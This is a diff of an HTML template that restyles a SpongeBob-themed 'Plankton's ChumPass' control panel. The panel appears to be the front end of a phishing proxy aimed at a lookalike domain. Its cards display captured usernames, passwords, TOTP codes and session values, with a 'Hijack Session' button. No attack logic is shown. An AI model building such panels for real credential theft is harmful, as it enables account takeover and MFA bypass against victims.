@@ -8,26 +8,72 @@
 </head>
 <body>
 
-<h1>Plankton's ChumPass™ — Control Panel</h1>
-<p class="status">PROXY INTERCEPTOR ACTIVE</p>
+<!-- CRT scanline + flicker overlay (purely decorative) -->
+<div class="crt" aria-hidden="true"></div>
+<div class="vignette" aria-hidden="true"></div>
 
-<div id="no-data-placeholder">
-  <p>Waiting for target authentication on krabsvau1t.com...</p>
-</div>
+<header class="console-header">
+  <img class="evil-logo" src="{{ url_for('static', path='evil-logo.png') }}"
+       alt="Plankton's ChumPass logo">
 
-<ul class="stolen-grid" id="stolen-list"></ul>
+  <div class="title-block">
+    <h1 class="glitch" data-text="Plankton's ChumPass™">Plankton's ChumPass™</h1>
+    <p class="tagline">“Snatching Secrets: One Password At A Time!”</p>
+    <p class="status" id="status-line">
+      <span class="status-dot"></span>PROXY INTERCEPTOR ACTIVE
+    </p>
+  </div>
+
+  <!-- Karen, Plankton's ever-disappointed computer wife -->
+  <aside class="karen">
+    <div class="karen-eye"></div>
+    <p class="karen-says">"Another scheme, Plankton?"</p>
+    <p class="karen-meta">KAREN&nbsp;v9000 · CHUM&nbsp;BUCKET&nbsp;OS</p>
+  </aside>
+</header>
+
+<main class="console-body">
+  <div id="no-data-placeholder" class="placeholder">
+    <div class="radar" aria-hidden="true"></div>
+    <p class="placeholder-title">SCANNING FOR PREY…</p>
+    <p class="placeholder-sub">Waiting for target authentication on
+      <span class="mono">krabsvau1t.com</span></p>
+  </div>
+
+  <ul class="stolen-grid" id="stolen-list"></ul>
+</main>
+
+<footer class="console-footer">
+  <span>CHUM BUCKET COVERT OPERATIONS</span>
+  <span class="footer-sep">//</span>
+  <span>EST. POPULATION: 1 EVIL GENIUS</span>
+  <span class="footer-sep">//</span>
+  <span class="blink">REC&nbsp;●</span>
+</footer>
 
 <template id="credential-card-tpl">
   <li class="credential-card">
+    <span class="card-brand">SPECIMEN&nbsp;ACQUIRED</span>
+
     <div class="card-header">
-      <h2>👤 <span data-field="username"></span></h2>
-      <span data-field="captures"></span>
-      <span data-field="time"></span>
+      <h2><span class="avatar">👤</span><span data-field="username"></span></h2>
+      <div class="card-meta">
+        <span class="captures" data-field="captures"></span>
+        <span class="time" data-field="time"></span>
+      </div>
     </div>
 
     <div class="field">
       <span class="field-label">Password</span>
       <span class="field-value" data-field="password"></span>
+    </div>
+
+    <div class="field mfa-field" data-field="mfa-field" hidden>
+      <div class="field-row">
+        <span class="field-label">MFA Code (TOTP)</span>
+        <span class="badge mfa" data-field="mfa-badge"></span>
+      </div>
+      <span class="field-value mfa-code" data-field="mfa-code"></span>
     </div>
 
     <div class="field">
@@ -38,7 +84,9 @@
       <span class="field-value" data-field="session"></span>
     </div>
 
-    <button class="hijack-btn" data-action="hijack">Hijack Session</button>
+    <button class="hijack-btn" data-action="hijack">
+      <span class="hijack-icon">☠</span> Hijack Session
+    </button>
   </li>
 </template>
 
